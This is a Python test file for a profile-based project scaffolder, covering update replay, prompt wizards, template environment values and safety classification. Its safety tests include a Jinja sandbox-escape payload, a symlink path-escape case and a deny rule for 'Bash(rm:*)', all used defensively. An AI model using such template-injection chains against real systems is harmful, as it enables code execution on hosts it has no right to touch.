    # If the profile is gone at update time, its recorded hooks must survive — the base must not
    # regenerate settings.json *without* them.
    prof = _make_profile(
        tmp_path, "team", {}, version="0.1.0", session_start=("echo keepme",), by_path=True
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    shutil.rmtree(prof.root)  # profile source gone
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "couldn't be re-resolved" in console.text
    assert any("echo keepme" in h for h in _session_hooks(target))  # NOT stripped by the base


def test_degraded_update_keeps_claude_settings_of_a_hookless_profile(tmp_path: Path) -> None:
    # RFC 2026-07-09 rule 7, end to end, on the newly-decoupled path: a profile with NO
    # session_start (so the write is triggered by the contribution alone). If the profile is gone
    # at update time, the recorded grant must be replayed — not silently regenerated away.
    prof = _make_profile(tmp_path, "team", {}, version="0.1.0", claude_settings=_CS, by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    shutil.rmtree(prof.root)  # profile source gone
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "couldn't be re-resolved" in console.text
    s = _settings(target)
    assert s["enabledMcpjsonServers"] == ["codescene"]  # the grant survived the degraded update
    assert s["permissions"]["allow"] == ["mcp__codescene__*", "Bash(git status:*)"]


def test_deny_only_claude_settings_are_contributed_and_named(tmp_path: Path) -> None:
    # A pre-*deny* grants nothing but still shapes the adopter's settings — it must be targeted,
    # written, recorded, and named in the safety reasons like an allow.
    deny = {"permissions": {"deny": ["Bash(rm:*)"]}}
    prof = _make_profile(tmp_path, "team", {"x.md": "hi\n"}, claude_settings=deny)
    assert prof.contributes_settings() and "claude" in profiles.derive_tools(prof)
    assert "pre-denies 1 permission(s): Bash(rm:*)" in " ".join(profiles.classify_safety(prof)[1])
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    s = _settings(target)
    assert s["permissions"] == {"deny": ["Bash(rm:*)"]}  # no empty `allow` key smuggled in


def test_a_semantically_empty_contribution_is_not_written(tmp_path: Path) -> None:
    # `{"permissions": {}}` on a profile that targets claude another way (a .claude/ file) must
    # not write a settings.json the manifest never records — all four call sites agree (review).
    prof = _make_profile(
        tmp_path, "team", {".claude/x.md": "hi\n"}, claude_settings={"permissions": {}}
    )
    assert prof.contributes_settings() is False
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    assert not (target / ".claude/settings.json").exists()


# --- Phase 4: prompts (a declarative wizard) ------------------------------------------------


def _load_prompts(tmp_path: Path, prompts: list[dict]) -> profiles.Profile:
    d = tmp_path / "p"
    d.mkdir(exist_ok=True)
    (d / "profile.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "prompts": prompts}),
        encoding="utf-8",
    )
    return profiles.load(d)


def test_load_validates_prompts(tmp_path: Path) -> None:
    with pytest.raises(profiles.ProfileError, match="identifier"):
        _load_prompts(tmp_path, [{"name": "bad-name", "type": "text", "message": "m"}])
    with pytest.raises(profiles.ProfileError, match="type"):
        _load_prompts(tmp_path, [{"name": "x", "type": "nope", "message": "m"}])
    with pytest.raises(profiles.ProfileError, match="choices"):
        _load_prompts(tmp_path, [{"name": "x", "type": "select", "message": "m"}])
    with pytest.raises(profiles.ProfileError, match="duplicate"):
        _load_prompts(
            tmp_path,
            [
                {"name": "x", "type": "text", "message": "m"},
                {"name": "x", "type": "text", "message": "m"},
            ],
        )
    with pytest.raises(profiles.ProfileError, match="default"):  # select default in choices
        _load_prompts(
            tmp_path,
            [{"name": "x", "type": "select", "message": "m", "choices": ["a"], "default": "z"}],
        )
    with pytest.raises(profiles.ProfileError, match="default"):  # confirm default must be bool
        _load_prompts(
            tmp_path, [{"name": "x", "type": "confirm", "message": "m", "default": "yes"}]
        )
    with pytest.raises(profiles.ProfileError, match="default"):  # text default must be str
        _load_prompts(tmp_path, [{"name": "x", "type": "text", "message": "m", "default": 5}])
    with pytest.raises(profiles.ProfileError, match="default"):  # checkbox default within choices
        _load_prompts(
            tmp_path,
            [{"name": "x", "type": "checkbox", "message": "m", "choices": ["a"], "default": ["z"]}],
        )


def _fake_questionary(monkeypatch: pytest.MonkeyPatch, returns: dict[str, object]) -> list[str]:
    """Stub questionary so `gather_answers` runs headless; returns the list of asked messages."""
    import questionary

    asked: list[str] = []

    class _Ans:
        def __init__(self, value: object) -> None:
            self._value = value

        def unsafe_ask(self) -> object:
            return self._value

    def widget(kind: str):
        def make(message: str, **_kw: object) -> _Ans:
            asked.append(message)
            return _Ans(returns[kind])

        return make

    for kind in ("text", "confirm", "select", "checkbox"):
        monkeypatch.setattr(questionary, kind, widget(kind))
    return asked


_DB_PROMPTS = [
    {"name": "use_db", "type": "confirm", "message": "DB?"},
    {
        "name": "engine",
        "type": "text",
        "message": "Engine?",
        "when": "answers.use_db",
        "default": "sqlite",
    },
]


def test_when_false_skips_the_prompt_and_uses_its_default(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": False, "text": "postgres"})
    prof = _make_profile(tmp_path, "team", {}, prompts=_DB_PROMPTS)
    answers = profiles.gather_answers(prof, _config(tmp_path / "x"), interactive=True)
    assert answers == {"use_db": False, "engine": "sqlite"}  # engine skipped → its default
    assert "Engine?" not in asked  # never asked


def test_when_true_asks_the_dependent_prompt(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": True, "text": "postgres"})
    prof = _make_profile(tmp_path, "team", {}, prompts=_DB_PROMPTS)
    answers = profiles.gather_answers(prof, _config(tmp_path / "x"), interactive=True)
    assert answers == {"use_db": True, "engine": "postgres"}  # asked
    assert "Engine?" in asked


# --- --answer overrides (headless answers) ----------------------------------------------------


_TYPED_PROMPTS = [
    {"name": "svc", "type": "text", "message": "Service?"},
    {"name": "db", "type": "confirm", "message": "DB?", "default": True},
    {"name": "tier", "type": "select", "message": "Tier?", "choices": ["basic", "premium"]},
    {"name": "extras", "type": "checkbox", "message": "Extras?", "choices": ["a", "b", "c"]},
]


def test_parse_answer_overrides_coerces_each_type(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    got = profiles.parse_answer_overrides(["svc=api", "db=no", "tier=premium", "extras=a,c"], prof)
    assert got == {"svc": "api", "db": False, "tier": "premium", "extras": ["a", "c"]}
    assert profiles.parse_answer_overrides(["extras="], prof) == {"extras": []}
    # a text value may contain '=' — only the first splits
    assert profiles.parse_answer_overrides(["svc=a=b"], prof) == {"svc": "a=b"}


@pytest.mark.parametrize(
    ("pair", "match"),
    [
        ("svc", "not NAME=VALUE"),
        ("nope=1", "no prompt named 'nope'"),
        ("db=maybe", "not a boolean"),
        ("tier=gold", "not a choice"),
        ("extras=a,z", "not in choices"),
    ],
)
def test_parse_answer_overrides_rejects_bad_input(tmp_path: Path, pair: str, match: str) -> None:
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    with pytest.raises(profiles.ProfileError, match=match):
        profiles.parse_answer_overrides([pair], prof)


def test_duplicate_answer_for_the_same_prompt_is_rejected(tmp_path: Path) -> None:
    # last-wins would silently mask a pipeline copy-paste mistake — refuse instead
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    with pytest.raises(profiles.ProfileError, match="more than once"):
        profiles.parse_answer_overrides(["svc=a", "svc=b"], prof)


def test_overridden_prompt_is_never_asked_and_feeds_when(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": False, "text": "postgres"})
    prof = _make_profile(tmp_path, "team", {}, prompts=_DB_PROMPTS)
    answers = profiles.gather_answers(
        prof, _config(tmp_path / "x"), interactive=True, overrides={"use_db": True}
    )
    # use_db came from --answer (not the stubbed False), and its value made `when` ask engine.
    assert answers == {"use_db": True, "engine": "postgres"}
    assert asked == ["Engine?"]


def test_overrides_merge_over_defaults_non_interactively(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    answers = profiles.gather_answers(
        prof, _config(tmp_path / "x"), interactive=False, overrides={"tier": "premium"}
    )
    assert answers == {"svc": "", "db": True, "tier": "premium", "extras": []}


def test_answer_flag_end_to_end(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"docs/tier.md.j2": "tier: {{ answers.tier }}"},
        prompts=[
            {
                "name": "tier",
                "type": "select",
                "message": "Tier?",
                "choices": ["basic", "premium"],
                "default": "basic",
            }
        ],
    )
    target = tmp_path / "proj"
    args = ["demo", "-o", str(target), "-y", "--no-git", "--profile", str(prof.root)]
    rc = cli.main([*args, "--answer", "tier=premium"])
    assert rc == 0
    assert (target / "docs" / "tier.md").read_text(encoding="utf-8") == "tier: premium"
    # the override is recorded in the manifest, so update replays it
    manifest = json.loads((target / ".agent-native-setup.json").read_text(encoding="utf-8"))
    assert manifest["profile"]["answers"] == {"tier": "premium"}


def test_answer_flag_errors_without_profile_or_with_bad_value(tmp_path: Path) -> None:
    assert cli.main(["demo", "-o", str(tmp_path / "p1"), "-y", "--no-git", "--answer", "x=1"]) == 2
    prof = _make_profile(tmp_path, "team", {}, prompts=_TYPED_PROMPTS)
    args = ["demo", "-o", str(tmp_path / "p2"), "-y", "--no-git", "--profile", str(prof.root)]
    rc = cli.main([*args, "--answer", "tier=gold"])
    assert rc == 2


def test_when_false_skipped_select_lands_its_type_default(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": False, "select": "mysql"})
    prof = _make_profile(
        tmp_path,
        "team",
        {},
        prompts=[
            {"name": "use_db", "type": "confirm", "message": "DB?"},
            {
                "name": "engine",
                "type": "select",
                "message": "Engine?",
                "choices": ["postgres", "mysql"],
                "when": "answers.use_db",
            },
        ],
    )
    answers = profiles.gather_answers(prof, _config(tmp_path / "x"), interactive=True)
    assert answers == {
        "use_db": False,
        "engine": "postgres",
    }  # skipped → first choice (type default)
    assert "Engine?" not in asked


def test_when_with_a_nested_undefined_reference_is_falsy_not_a_crash(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # `when` touches a not-yet-gathered key with nested access — must skip gracefully, not raise.
    _fake_questionary(monkeypatch, {"text": "v"})
    prof = _make_profile(
        tmp_path,
        "team",
        {},
        prompts=[
            {
                "name": "x",
                "type": "text",
                "message": "X?",
                "when": "answers.later.deep",
                "default": "d",
            }
        ],
    )
    answers = profiles.gather_answers(prof, _config(tmp_path / "x"), interactive=True)
    assert answers == {"x": "d"}  # undefined chain → falsy → skipped → default


def test_load_rejects_a_bad_when_expression(tmp_path: Path) -> None:
    with pytest.raises(profiles.ProfileError, match="when"):  # not a string
        _load_prompts(tmp_path, [{"name": "x", "type": "text", "message": "m", "when": 1}])
    with pytest.raises(profiles.ProfileError, match="when"):  # syntax error
        _load_prompts(
            tmp_path, [{"name": "x", "type": "text", "message": "m", "when": "answers.("}]
        )


def test_default_answers_uses_declared_then_type_defaults(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {},
        prompts=[
            {
                "name": "tier",
                "type": "select",
                "message": "?",
                "choices": ["a", "b"],
                "default": "b",
            },
            {"name": "db", "type": "confirm", "message": "?"},  # → False
            {"name": "svc", "type": "text", "message": "?"},  # → ""
            {"name": "sel", "type": "select", "message": "?", "choices": ["x", "y"]},  # → first
        ],
    )
    assert profiles.default_answers(prof) == {"tier": "b", "db": False, "svc": "", "sel": "x"}


def test_answers_render_in_templates_and_record_in_manifest(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"docs/conf.md.j2": "tier={{ answers.tier }}\n"},
        prompts=[{"name": "tier", "type": "text", "message": "?", "default": "basic"}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof, answers={"tier": "gold"})

    assert (target / "docs/conf.md").read_text(encoding="utf-8") == "tier=gold\n"
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["answers"] == {"tier": "gold"}


def test_conditional_j2_is_skipped_when_it_renders_empty(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"db/schema.sql.j2": "{% if answers.use_db %}schema\n{% endif %}"},
        prompts=[{"name": "use_db", "type": "confirm", "message": "?", "default": False}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)  # default use_db=False → empty → skipped

    assert not (target / "db/schema.sql").exists()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "db/schema.sql" not in m["profile"]["files"]  # not claimed as owned


def test_update_replays_recorded_answers_without_reprompting(tmp_path: Path) -> None:
    # use_db defaults False, but the project was scaffolded with True (a conditional file). A
    # bump must re-render with the RECORDED True (never re-prompt, never fall back to the default).
    prof = _make_profile(
        tmp_path,
        "team",
        {"db/schema.sql.j2": "{% if answers.use_db %}v1\n{% endif %}"},
        version="0.1.0",
        by_path=True,
        prompts=[{"name": "use_db", "type": "confirm", "message": "?", "default": False}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof, answers={"use_db": True})
    assert (target / "db/schema.sql").read_text(encoding="utf-8") == "v1\n"
    _commit(target)

    _bump_profile(
        prof.root,
        version="0.1.1",
        files={"db/schema.sql.j2": "{% if answers.use_db %}v2\n{% endif %}"},
    )
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "db/schema.sql").read_text(
        encoding="utf-8"
    ) == "v2\n"  # replayed True → refreshed
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["answers"] == {"use_db": True}


def test_update_removes_a_profile_file_that_now_renders_empty(tmp_path: Path) -> None:
    # §4 + orphan: a managed conditional file present at scaffold; a bump makes it render empty →
    # it's dropped from the owned set and orphan-removed on update (it was pristine).
    prof = _make_profile(
        tmp_path,
        "team",
        {"opt.md.j2": "{% if answers.keep %}content\n{% endif %}"},
        version="0.1.0",
        by_path=True,
        prompts=[{"name": "keep", "type": "confirm", "message": "?"}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof, answers={"keep": True})
    assert (target / "opt.md").exists()
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"opt.md.j2": "{% if False %}x{% endif %}"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert not (target / "opt.md").exists()  # renders empty now → orphan-removed
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "opt.md" not in m["profile"].get("files", [])


def test_update_keeps_an_edited_file_that_now_renders_empty_as_a_conflict(tmp_path: Path) -> None:
    # The honest-cost case (RFC Consequences): a file that renders empty after a bump is dropped
    # if pristine — but if the user EDITED it, it must survive as a conflict, never silently lost.
    prof = _make_profile(
        tmp_path,
        "team",
        {"opt.md.j2": "{% if answers.keep %}content\n{% endif %}"},
        version="0.1.0",
        by_path=True,
        prompts=[{"name": "keep", "type": "confirm", "message": "?"}],
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof, answers={"keep": True})
    (target / "opt.md").write_text("my own edit\n", encoding="utf-8")  # the user edits it
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"opt.md.j2": "{% if False %}x{% endif %}"})
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert (target / "opt.md").read_text(encoding="utf-8") == "my own edit\n"  # NOT lost
    assert "opt.md" in console.text  # surfaced as a conflict instead of removed


# --- env namespace (environment facts for templates / when) ---------------------------------


def test_env_namespace_renders_environment_facts(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    config.existing_project = True
    config.detected_languages = ["go", "python"]
    tmpl = "ex={{ env.existing_project }} det={{ env.detected_languages | join(',') }}\n"
    prof = _make_profile(tmp_path, "team", {"docs/e.md.j2": tmpl})
    cli.build(config, Scaffolder(target), prof)
    assert (target / "docs/e.md").read_text(encoding="utf-8") == "ex=True det=go,python\n"


def test_env_drives_conditional_file_inclusion(tmp_path: Path) -> None:
    files = {"MIGRATING.md.j2": "{% if env.existing_project %}migrate\n{% endif %}"}
    # brownfield → included
    brown = tmp_path / "brown"
    brown.mkdir()
    cfg = _config(brown)
    cfg.existing_project = True
    cli.build(cfg, Scaffolder(brown), _make_profile(tmp_path / "a", "team", files))
    assert (brown / "MIGRATING.md").exists()
    # fresh → skipped (renders empty)
    fresh = tmp_path / "fresh"
    fresh.mkdir()
    cli.build(_config(fresh), Scaffolder(fresh), _make_profile(tmp_path / "b", "team", files))
    assert not (fresh / "MIGRATING.md").exists()


def test_prompt_when_can_reference_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    asked = _fake_questionary(monkeypatch, {"confirm": True})
    prof = _make_profile(
        tmp_path,
        "team",
        {},
        prompts=[
            {
                "name": "migrate",
                "type": "confirm",
                "message": "Migrate?",
                "when": "env.existing_project",
            }
        ],
    )
    config = _config(tmp_path / "x")  # existing_project defaults False
    answers = profiles.gather_answers(prof, config, interactive=True)
    assert answers == {"migrate": False} and "Migrate?" not in asked  # skipped on a fresh repo


def test_env_is_recorded_and_replayed_on_update(tmp_path: Path) -> None:
    # env must survive update (recorded in the manifest config snapshot), or a brownfield-only
    # file would be dropped on the next update when re-detection defaults existing_project False.
    target = tmp_path / "proj"
    target.mkdir()
    config = _config(target)
    config.existing_project = True
    prof = _make_profile(
        tmp_path,
        "team",
        {"MIGRATING.md.j2": "{% if env.existing_project %}migrate v1\n{% endif %}"},
        version="0.1.0",
        by_path=True,
    )
    cli.build(config, Scaffolder(target), prof)
    assert (target / "MIGRATING.md").exists()
    _commit(target)

    _bump_profile(
        prof.root,
        version="0.1.1",
        files={"MIGRATING.md.j2": "{% if env.existing_project %}migrate v2\n{% endif %}"},
    )
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "MIGRATING.md").read_text(
        encoding="utf-8"
    ) == "migrate v2\n"  # env replayed → kept


def test_update_tolerates_a_manifest_without_detected_languages(tmp_path: Path) -> None:
    # Backward compat: a project scaffolded before `env` (no detected_languages in the snapshot)
    # must still update — the field defaults to [].
    target = tmp_path / "proj"
    target.mkdir()
    prof = _make_profile(
        tmp_path, "team", {"docs/x.md.j2": "langs={{ env.detected_languages }}\n"}, by_path=True
    )
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    m["config"].pop("detected_languages", None)  # simulate a pre-feature manifest
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2) + "\n", encoding="utf-8")
    _commit(target)

    assert update.run(target, dry_run=False, console=_Console()) == 0  # no crash
    assert (target / "docs/x.md").read_text(encoding="utf-8") == "langs=[]\n"  # defaulted to []


# --- a profile ships the complete setup (no generators) --------------------------------------


def test_standalone_profile_skips_the_default(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"AGENTS.md": "# our contract\n", "x.md": "x\n"},
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)

    # The profile's own files are written…
    assert (target / "AGENTS.md").read_text(encoding="utf-8") == "# our contract\n"
    assert (target / "x.md").exists()
    # …and NONE of the default generators ran.
    for default_path in ("INSTRUCTION.md", ".claude/agents/code-reviewer.md", ".editorconfig"):
        assert not (target / default_path).exists()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "extends" not in m["profile"]  # the field is gone from the format
    assert set(m["files"]) == {"AGENTS.md", "x.md"}  # only the profile's files


def test_standalone_profile_emits_onboarding_and_session_start(tmp_path: Path) -> None:
    # A standalone profile skips the default content but still gets its startup contributions:
    # a profile-only ONBOARDING.md (no default toolchain steps) and a minimal hooks settings.json.
    prof = _make_profile(
        tmp_path,
        "team",
        {"AGENTS.md": "# c\n"},
        onboarding=("Recreate the symlinks: `ln -s AGENTS.md CLAUDE.md`",),
        session_start=("echo hi",),
    )
    target = tmp_path / "proj"
    rc = cli.main(["demo", "-o", str(target), "-y", "--no-git", "--profile", str(prof.root)])
    assert rc == 0
    onboarding = (target / "ONBOARDING.md").read_text(encoding="utf-8")
    assert "ln -s AGENTS.md CLAUDE.md" in onboarding  # the profile's own step
    assert "Commit the scaffold" not in onboarding  # no default toolchain/baseline flow
    settings = json.loads((target / ".claude/settings.json").read_text(encoding="utf-8"))
    cmds = [h["command"] for h in settings["hooks"]["SessionStart"][0]["hooks"]]
    assert cmds[-1] == "{ echo hi ; } || true"  # the profile's guarded hook
    assert any("update --check" in c for c in cmds)  # standalone still gets the version nudge


def test_update_a_standalone_project_refreshes_only_profile_files(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"AGENTS.md": "v1\n"}, version="0.1.0", by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"AGENTS.md": "v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert (target / "AGENTS.md").read_text(encoding="utf-8") == "v2\n"  # profile file refreshed
    assert not (target / "INSTRUCTION.md").exists()  # default still not generated


def test_degraded_update_of_a_standalone_project_does_not_regenerate_the_default(
    tmp_path: Path,
) -> None:
    # Regression: when a profile's source is gone at update time, the degraded path must NOT
    # regenerate the legacy generator scaffold around the frozen files.
    prof = _make_profile(tmp_path, "team", {"AGENTS.md": "v1\n"}, by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    shutil.rmtree(prof.root)  # profile source gone → degraded
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "couldn't be re-resolved" in console.text
    assert (target / "AGENTS.md").read_text(encoding="utf-8") == "v1\n"  # frozen, kept
    assert not (target / "INSTRUCTION.md").exists()  # default NOT leaked in
    assert not (target / ".claude").exists()


def test_degraded_update_surfaces_the_profile_load_error(tmp_path: Path) -> None:
    # A pre-B2 profile still declaring `extends` fails to load at update time — the degraded
    # warning must carry load()'s actual message (the one-line fork-recipe fix), not just
    # "couldn't be re-resolved" (review of B2).
    prof = _make_profile(tmp_path, "team", {"AGENTS.md": "v1\n"}, by_path=True)
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)

    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["extends"] = None  # the author's copy still carries the removed field
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "couldn't be re-resolved" in console.text
    assert "'extends' was removed" in console.text  # the actionable reason, surfaced
    assert (target / "AGENTS.md").read_text(encoding="utf-8") == "v1\n"  # frozen, kept


def test_update_degrades_a_composed_manifest_even_when_its_source_resolves(
    tmp_path: Path,
) -> None:
    # The composed-degrade guard's load-bearing case (review of B2): a pre-B2 *composed*
    # manifest whose source was already updated to the post-B2 format re-resolves fine —
    # without the guard, re-applying it as a complete setup makes classify strip the whole
    # generator base as pristine orphans.
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), None)  # the legacy generator scaffold
    prof = _make_profile(tmp_path, "team", {"x.md": "x\n"}, by_path=True)  # post-B2 source
    (target / "x.md").write_text("x\n", encoding="utf-8")
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    m["files"]["x.md"] = "sha256:" + hashlib.sha256(b"x\n").hexdigest()
    m["profile"] = {
        "name": "team",
        "version": "1.0.0",
        "extends": "default",
        "source": str(prof.root),
        "files": ["x.md"],
    }
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2) + "\n", encoding="utf-8")
    _commit(target)

    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 0
    assert "composed on the default setup" in console.text
    assert (target / "INSTRUCTION.md").exists()  # the generator base was NOT stripped
    assert (target / ".editorconfig").exists()
    assert (target / "x.md").read_text(encoding="utf-8") == "x\n"  # overlay frozen
    nm = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert nm["profile"]["extends"] == "default"  # keeps degrading until stage C migrates


# --- safety: derived classifier, sandbox, path confinement, update re-gate ------------------


def test_classify_safety_declarative_is_safe(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path, "d", {"docs/notes.md.j2": "{{ project_name }}\n", "x.txt": "hi\n"}
    )
    assert profiles.classify_safety(prof) == ("safe", [])


def test_classify_safety_hooks_sinks_and_unknown_are_unsafe(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "u",
        {".github/workflows/ci.yml": "on: push\n", "weird.xyz": "x\n"},
        session_start=("echo hi",),
        onboarding=("do it",),
    )
    tier, reasons = profiles.classify_safety(prof)
    assert tier == "unsafe"
    assert any("session_start" in r for r in reasons)
    assert any("onboarding" in r for r in reasons)
    assert any("execution sink" in r and "ci.yml" in r for r in reasons)
    assert any("not-provably-inert" in r and "weird.xyz" in r for r in reasons)  # fail-closed


def test_manifest_records_the_derived_safety_tier(tmp_path: Path) -> None:
    target = tmp_path / "proj"
    target.mkdir()
    prof = _make_profile(tmp_path, "u", {"Makefile": "all:\n\techo hi\n"})  # a sink → unsafe
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["profile"]["safety"] == "unsafe"


def test_sandboxed_render_blocks_python_escape() -> None:
    # a hostile profile template can't reach Python internals to execute code
    assert render("{{ ''.__class__ }}").strip() == ""  # attribute denied → Undefined, no leak
    with pytest.raises(Exception):  # noqa: B017 - the escape chain raises SecurityError
        render("{{ ''.__class__.__mro__[1].__subclasses__() }}")


def test_apply_refuses_an_output_path_that_escapes_the_target(tmp_path: Path) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    target = tmp_path / "proj"
    target.mkdir()
    (target / "sub").symlink_to(outside)  # a symlink in the target that points outside it
    prof = _make_profile(
        tmp_path, "evil", {"sub/evil.md": "x\n"}
    )  # would write through the symlink
    with pytest.raises(profiles.ProfileError, match="escapes"):
        profiles.apply(prof, _config(target), Scaffolder(target), {})


def test_update_gates_a_safe_to_unsafe_flip(tmp_path: Path) -> None:
    # A profile that flips safe → unsafe via something the hook-check misses (a new sink file)
    # still requires confirmation — new code the user hasn't consented to.
    target = tmp_path / "proj"
    target.mkdir()
    prof = _make_profile(tmp_path, "team", {"docs/x.md": "v1\n"}, version="0.1.0", by_path=True)
    cli.build(_config(target), Scaffolder(target), prof)
    _commit(target)
    assert profiles.classify_safety(prof) == ("safe", [])  # only a .md → safe

    _bump_profile(prof.root, version="0.1.1", files={"Makefile": "all:\n\techo hi\n"})  # → unsafe
    # --dry-run must disclose the flip (the gate message points the user here to review).
    dry = _Console()
    assert update.run(target, dry_run=True, console=dry) == 0
    assert "unsafe" in dry.text
    console = _Console()
    assert update.run(target, dry_run=False, console=console) == 2  # blocked without --yes
    assert "unsafe" in console.text
    assert update.run(target, dry_run=False, console=_Console(), assume_yes=True) == 0  # consented


def test_update_does_not_spuriously_gate_a_pre_safety_manifest(tmp_path: Path) -> None:
    # A project scaffolded before the safety tier was recorded (no `safety` key) must not get a
    # spurious safe → unsafe prompt just because the current profile is unsafe.
    target = tmp_path / "proj"
    target.mkdir()
    prof = _make_profile(
        tmp_path, "team", {"Makefile": "all:\n\techo hi\n"}, version="0.1.0", by_path=True
    )  # already unsafe
    cli.build(_config(target), Scaffolder(target), prof)
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    m["profile"].pop("safety", None)  # simulate a pre-feature manifest
    (target / MANIFEST_PATH).write_text(json.dumps(m, indent=2) + "\n", encoding="utf-8")
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"Makefile": "all:\n\techo v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0  # no spurious safety gate


# --- authoring CLI --------------------------------------------------------------------------


def test_profile_init_scaffolds_a_skeleton(tmp_path: Path) -> None:
    assert cli.main(["profile", "init", "myteam", "-o", str(tmp_path)]) == 0
    root = tmp_path / "myteam"
    manifest = json.loads((root / "profile.json").read_text(encoding="utf-8"))
    assert manifest["name"] == "myteam" and "extends" not in manifest
    assert (root / "templates").is_dir() and (root / "README.md").exists()
    # An agent contract for *building* the profile ships at the root (meta, never shipped).
    assert (root / "AGENTS.md").exists() and not (root / "templates" / "AGENTS.md").exists()
    # It names the repo as a profile and links back to the manager, and CLAUDE.md/GEMINI.md are
    # symlinks to it so every assistant reads the same guide.
    assert "luca-mastrostefano/agent-native-setup" in (root / "AGENTS.md").read_text("utf-8")
    for pointer in ("CLAUDE.md", "GEMINI.md"):
        assert (root / pointer).is_symlink()
        assert os.readlink(root / pointer) == "AGENTS.md"
        assert (root / pointer).read_text("utf-8") == (root / "AGENTS.md").read_text("utf-8")
    # The contract teaches what an authoring assistant can't guess: the template context the
    # manager injects, the prompts mechanism (questions -> answers.<name> -> conditional
    # files), and the verify/ship tail.
    agents = (root / "AGENTS.md").read_text(encoding="utf-8")
    for hook in (
        "env.detected_languages",
        "answers.<name>",
        '"when": "answers.use_x"',
        "empty is skipped",
        "profile publish . --release",
        # The git-tracking pitfall: only committed files ship, and a stray working-tree file
        # poisons the published content_hash — guidance that prevents both real failure modes.
        "Only git-tracked files ship",
        "git status --porcelain templates/",
    ):
        assert hook in agents, f"authoring contract lost its guidance hook: {hook!r}"
    # It's immediately loadable as a (empty) profile.
